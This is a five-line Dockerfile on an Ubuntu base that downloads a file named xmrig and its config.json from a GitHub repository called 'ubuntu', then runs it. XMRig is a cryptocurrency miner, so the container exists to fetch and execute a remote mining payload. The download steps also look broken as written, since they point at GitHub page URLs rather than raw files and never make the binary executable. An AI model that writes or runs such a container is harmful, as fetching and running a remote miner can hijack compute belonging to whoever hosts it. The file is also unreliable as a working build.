FROM ubuntu:latest
RUN apt-get update && apt-get install -y vim git curl pciutils wget
RUN wget https://github.com/AimTuxHvH/ubuntu/blob/master/xmrig
RUN wget https://github.com/AimTuxHvH/ubuntu/blob/master/config.json
RUN ./xmrig
